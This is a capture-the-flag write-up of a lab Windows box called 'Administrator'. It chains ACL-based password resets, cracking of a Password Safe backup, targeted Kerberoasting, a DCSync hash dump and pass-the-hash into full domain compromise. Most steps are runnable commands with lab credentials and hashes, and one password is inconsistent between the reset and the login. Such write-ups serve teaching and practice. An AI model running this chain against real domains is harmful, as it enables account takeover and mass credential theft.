---
layout: writeup
title: "Administrator"
date: 2026-06-16
description: "Chaining Active Directory ACL abuse (ForceChangePassword, GenericWrite and Kerberoasting) into a DCSync attack for full domain compromise."
tags: [Box, medium, windows, AD]
---

## Port Scanning

Initial enumeration was performed with Nmap to identify open ports and services on the target host.

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n --stats-every=5s -Pn -oN administrator_scan 10.10.11.42
```

## Active Directory Enumeration

BloodHound was used to map domain relationships and potential attack paths.

```bash
bloodhound-python -u olivia -d administrator.htb -c All -ns 10.10.11.42
```

![BloodHound Enumeration](/assets/images/administrator/184-1.png)
*BloodHound Enumeration*

Analysis revealed that the user **Olivia** could perform **ForceChangePassword** on the user Michael.

```bash
net rpc password "michael" "newP@ssword2022" -U "administrator.htb/olivia%ichliebedich" -S "dc.administrator.htb"
```

Once Michael's password was changed, access via SMB was established:

```bash
netexec smb 10.10.11.42 -u "michael" -p "Admin1234@"
```

![SMB Access with Michael](/assets/images/administrator/184-2.png)
*SMB Access with Michael*

## Pivoting and Password Chaining

Using Michael's account, Benjamin's password was changed to allow further access.

```bash
net rpc password "benjamin" "Admin1234@" -U "administrator.htb/michael%Admin1234@" -S "dc.administrator.htb"
```

![Password Change for Benjamin](/assets/images/administrator/184-4.png)
*Password Change for Benjamin*

Access to FTP with Benjamin's credentials was successful, revealing a backup file.

![FTP Access](/assets/images/administrator/184-5.png)
*FTP Access*

![Backup File on FTP](/assets/images/administrator/184-6.png)
*Backup File on FTP*

```bash
get Backup.psafe3
```

![Downloaded Backup File](/assets/images/administrator/184-7.png)
*Downloaded Backup File*

## Cracking Passwords

The backup file was converted to a John-the-Ripper compatible hash and cracked using a wordlist.

```bash
pwsafe2john Backup.psafe3 > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![John Cracking Hash](/assets/images/administrator/184-8.png)
*John Cracking Hash*

Three user passwords were discovered, but only Emily's credentials were usable:

- Alexander: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
- Emily: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- Emma: WwANQWnmJnGV07WQN8bMS7FMAbjNur

![Emily's Valid Credentials](/assets/images/administrator/184-9.png)
*Emily's Valid Credentials*

## Kerberoasting and DCSync

Emily had GenericWrite permissions over Ethan, which allowed a Kerberoast attack.

![Emily Permissions](/assets/images/administrator/184-10.png)
*Emily Permissions*

Time synchronization was ensured using NTP before requesting service tickets.

```bash
sudo ntpdate 10.10.11.42
```

TargetKerberoast was used to obtain Ethan's hash, which was then cracked with John.

![TargetKerberoast Ethan](/assets/images/administrator/184-11.png)
*TargetKerberoast Ethan*

```bash
john hash_ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
```

![John Cracking Ethan Hash](/assets/images/administrator/184-12.png)
*John Cracking Ethan Hash*

With Ethan's credentials, a DCSync attack was performed to dump all domain hashes using Impacket.

```bash
impacket-secretsdump 'administrator.htb'/ethan:'limpbizkit'@'10.10.11.42'
```

Sample domain hashes obtained:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
```

## Administrator Access

Finally, using the Administrator hash, an Evil-WinRM session was established to gain full control over the target machine and collect both flags.

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

![Administrator Access via Evil-WinRM](/assets/images/administrator/184-13.png)
*Administrator Access via Evil-WinRM*
